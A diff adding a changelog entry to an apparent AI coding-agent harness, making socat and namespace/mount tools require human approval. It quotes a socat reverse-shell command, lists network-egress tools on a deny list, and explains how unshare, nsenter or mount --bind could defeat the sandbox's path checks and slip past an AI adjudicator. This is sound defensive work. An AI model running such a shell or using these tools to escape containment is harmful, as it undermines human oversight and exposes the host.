@@ -26,6 +26,19 @@ Notable changes to AI Dev Autopilot. Format follows
   re-measures the worst admitted case against the timeout registered in the
   deployed settings.
 
+- **`socat`, mounts and namespace tools are now human-only.** `socat` was
+  missing from the network-egress list that already carried `nc`, `ncat`, `ssh`
+  and `rsync`, while being strictly more capable than any of them —
+  `socat TCP:host:443 EXEC:/bin/bash` is a reverse shell — and it is the one
+  network tool this project installs itself in `make deps`. Alongside it, a new
+  screen for the tools that move the ground every other rule stands on: every
+  containment decision here canonicalises a path and asks whether it is inside
+  the workspace, and `mount --bind`, `unshare`, `nsenter`, `chroot`, `setpriv`
+  and `capsh` make a path mean something else or run a program somewhere none of
+  it was measured against. All were previously approved with no dialog. They sit
+  above Codex, because "does this change a file, process or remote state?" is a
+  question an adjudicator can reasonably answer *no* to for `unshare … id`.
+
 - **Scheduled execution is now a human decision.** The broad local-dev fallback
   trusts the sandbox and the guard to contain what it approves — an argument
   that holds for every command that runs *now* and fails for every command that
